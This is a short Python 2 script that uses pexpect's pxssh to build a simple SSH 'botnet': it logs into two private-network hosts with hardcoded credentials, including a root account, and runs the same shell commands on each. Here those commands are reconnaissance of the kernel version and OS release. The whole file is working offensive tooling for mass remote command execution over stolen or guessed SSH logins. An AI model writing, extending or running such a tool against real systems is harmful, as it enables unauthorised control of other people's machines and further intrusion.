from pexpect import pxssh

botNet = []

class Client(object):
	"""docstring for Client"""
	def __init__(self, host, user, password):
		self.host  = host
		self.user = user
		self.password = password
		self.session = self.connect()
	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host, self.user, self.password)
			return s
		except Exception, e:
			print e
			print '[-] Error Connnecting'
	def send_command(self, cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before

def botnetCommand(command):
	for client in botNet:
		output= client.send_command(command)
		print '[*] output from ' + client.host
		print '[+] ' + output + '\n'

def addClient(host, user, password):
	client = Client(host, user, password)
	botNet.append(client)

addClient('172.16.16.69', 'root', 'hyemd')
addClient('172.16.16.62', 'jimmy', '123456')

botnetCommand('uname -v')
botnetCommand('cat /etc/issue')
